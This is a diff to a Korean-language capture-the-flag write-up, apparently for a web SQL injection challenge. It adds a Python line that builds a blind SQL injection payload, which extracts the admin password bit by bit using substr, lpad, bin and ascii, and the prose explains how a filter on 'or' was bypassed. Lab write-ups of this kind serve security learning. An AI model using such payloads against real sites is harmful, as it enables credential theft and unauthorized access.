@@ -69,6 +69,9 @@ if req(flag) :
 ```
 
 이번 문제는 admin의 pw를 알아내야 하는 문제다.  
+``` python
+a = "'||id='admin'&&substr(lpad(bin(ascii(substr(pw, " + str(i+1) + ", 1))), 8, 0)," + str(j+1) + ", 1)=0#"
+```
 코드에서 보면 pw를 한글자씩 가져와 ascii로 변환한 값을 바이너리로 변환한다. 그리고 그 값을 포함한 8자리의 왼쪽은 0으로 채우고, 그 값을 한글자씩 가져와 비교한다.  
 원래 ascii() 함수가 아닌 ord() 함수를 썼는데 or이 필터링 되어 있어서 ascii로 바꿔주었다.  
 flag가 나오고 문제가 풀린다.
